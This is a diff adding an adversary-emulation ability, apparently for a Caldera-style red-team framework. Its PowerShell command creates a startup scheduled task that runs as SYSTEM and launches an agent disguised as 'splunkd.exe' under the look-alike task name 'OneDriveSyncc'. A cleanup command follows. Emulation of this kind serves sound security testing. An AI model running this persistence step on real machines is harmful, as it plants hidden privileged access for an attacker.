@@ -1,0 +1,28 @@
+- id: e3a1b4c2-d5e6-4f7a-8b9c-0d1e2f3a4b5c
+  name: Persistence - Privileged Scheduled Task (On Startup)
+  description: Establishes persistence by creating a high-integrity scheduled task that runs as SYSTEM on system startup.
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  privilege: Elevated
+  platforms:
+    windows:
+      psh:
+        command: |
+          $agentExe = "C:\Users\Public\splunkd.exe";
+          $agentArgs = "-server #{server} -group #{group}";
+          $action = New-ScheduledTaskAction -Execute $agentExe -Argument $agentArgs;
+          $trigger = New-ScheduledTaskTrigger -AtStartup;
+          $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM";
+          $taskName = "OneDriveSyncc";
+          Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force;
+          Write-Host "SUCCESS: '$($taskName)'";
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'host.persistence.privileged_task'
+              custom_parser_vals:
+                regex: "SUCCESS: '(.+)'"
+                edge_label: 'has_persistence_method'
+        cleanup:
+          - Unregister-ScheduledTask -TaskName "OneDriveSyncc" -Confirm:$false
